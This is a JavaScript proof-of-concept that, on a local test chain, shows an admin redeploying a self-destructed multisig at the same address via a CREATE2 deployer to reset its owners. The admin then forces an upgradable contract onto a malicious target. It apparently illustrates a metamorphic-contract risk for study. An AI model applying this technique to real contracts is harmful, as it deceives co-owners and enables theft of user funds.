const fs = require("fs");

const { solc } = require("@ethersproject/cli");
const { ethers } = require("ethers");

// I use Lurch to make this hack easier to perform, but you
// could use create2 directly
const Lurch = "0x166a6e9b33AD1d7BcC1cf8ac3A6b9E85e8a11828";

(async function() {
    // Connect to a dev network (we amp up the polling interval to speed things up)
    const provider = ethers.getDefaultProvider("http://localhost:8545");
    provider.pollingInterval = 500;

    // Create a new account to be the attacker
    const signer = ethers.Wallet.createRandom().connect(provider);

    console.log(`You (the untrustworth admin):\n  ${ signer.address }`);

    // Fund the new account
    {
        const tx = await provider.getSigner().sendTransaction({
            to: signer.address,
            value: ethers.utils.parseEther("1.0")
        });
        await tx.wait();
    }

    // Compile all our sources
    const codes = { };
    ["./Multisig.sol", "./Upgradable.sol"].forEach((filename) => {
        try {
            solc.compile(fs.readFileSync(filename).toString(), {
                optimize: true
            }).forEach((code) => {
                codes[code.name] = code;
            });
        } catch (error) {
            console.log("ERROR", error);
            error.errors.forEach((e) => { console.log(e); });
            throw error;
        }
    });
    console.log(`Contracts: \n  ${ Object.keys(codes).join("\n  ") }`);

    // Deploy the safe proxy target
    let safeTarget = null;
    {
        const code = codes.SafeProxyable;
        const factory = new ethers.ContractFactory(code.interface, code.bytecode, signer);
        safeTarget = await factory.deploy();
        await safeTarget.deployTransaction.wait();
    }
    console.log(`Safe Target deployed to:\n  ${ safeTarget.address }`);

    // Deploy the multisig (notice we use rooted)
    // See: https://blog.ricmoo.com/contract-upgrade-wizardry-rooted-cd5c6726132b
    let multisig = null;
    {
        const code = codes.MyLittleProxyMultisig;
        const factory = new ethers.ContractFactory(code.interface, code.bytecode, signer);

        // Normally, we would use this:
        //multisig = factory.deploy(safeTarget.address);

        // We deploy using rooted (deployed using its deploy script)
        const tx = factory.getDeployTransaction(safeTarget.address);
        tx.to = Lurch;
        const txSent = await signer.sendTransaction(tx);
        const receipt = await txSent.wait();
        multisig = new ethers.Contract(ethers.utils.hexDataSlice(receipt.logs[1].data, 12), code.interface, signer);
    }
    console.log(`Multisig deployed to:\n  ${ multisig.address}`);

    // This would be a trusted party, who people could assume once
    // added, you can do no harm and that party *believes* themselves
    // to have control over any upgrade process via the multisig
    const trustedAdmin = "0x0123456789012345678901234567890123456789";

    // Add the trusted admin
    {
        const txPropose = await multisig.addProposal(1, trustedAdmin);
        const receiptPropose = await txPropose.wait();
        const txVote = await multisig.voteProposal(receiptPropose.events[0].args.proposalId);
        const receiptVote = await txVote.wait();
        console.log(`Added (trusted) owner to Multisig:\n  ${ trustedAdmin }`);
    }

    // Verify the owners
    {
        console.log("Multisig Owners (based on events):");
        (await multisig.queryFilter(multisig.filters.AddedOwner())).forEach((event) => {
            console.log("  " + event.args.owner);
        });
    }

    // Deploy the upgradable contract
    let contract = null;
    {
        const code = codes.MyLittleProxyUpgradableContract;
        const factory = new ethers.ContractFactory(code.interface, code.bytecode, signer);
        contract = await factory.deploy(multisig.address);
        const receipt = await contract.deployTransaction.wait();
        console.log(`Multisig codehash: \n  ${ receipt.logs[0].data }`);
    }
    console.log(`Contract (controlled by the multisig) deployed to:\n  ${ contract.address }`);

    // Test calling the Proxy Contract
    {
        const value = await contract.doPublicSomething();
        console.log(`Message from calling the contract:\n  ${ JSON.stringify(value) }`);
    }

    console.log("======== Hack begins ========");

    // Everything seems fine! And with a trusted admin, the contract
    // cannot be upgraded without agreement

    ///////////////
    // Begin the hack (continue? We already set up the multisig sneky-like)

    // Deploy the dangerous proxy target
    let dangerousTarget = null;
    {
        const code = codes.DangerousProxyable;
        const factory = new ethers.ContractFactory(code.interface, code.bytecode, signer);
        dangerousTarget = await factory.deploy();
        await dangerousTarget.deployTransaction.wait();
    }
    console.log(`Dangerous Target deployed to:\n  ${ dangerousTarget.address }`);

    // Destroy the multisig; the idea was that any single owner
    // could do this, so that anyone could force the contract
    // to be un-upgradabvle, ever again...
    {
        const tx = await multisig.relinquish();
        await tx.wait();
        const code = await provider.getCode(multisig.address);
        console.log(`Multisig code: \n  ${ code }`);
        if (code === "0x") {
            console.log("  Note: The multisig is now dead; theoretically upgrades are disabled");
        }
    }

    // Re-deploy the multisig, resetting the owners and using the dangerous target
    {
        const code = codes.MyLittleProxyMultisig;
        const factory = new ethers.ContractFactory(code.interface, code.bytecode, signer);

        // We deploy (again) using rooted
        const tx = factory.getDeployTransaction(dangerousTarget.address);
        tx.to = Lurch;

        const txSent = await signer.sendTransaction(tx);
        const receipt = await txSent.wait();

        // The multisig is still at same address, with the same code (and
        // therefore codehash) but new state
    }
    console.log(`Multisig re-deployed to:\n  ${ multisig.address } (same address, same codehash, new state)`);

    // Force the contract to upgrade
    {
        const tx = await contract.upgrade();
        await tx.wait();
    }

    // Test calling the Proxy Contract again...
    {
        const value = await contract.doPublicSomething();
        console.log(`Message from calling the contract:\n  ${ JSON.stringify(value) }`);
    }

})();
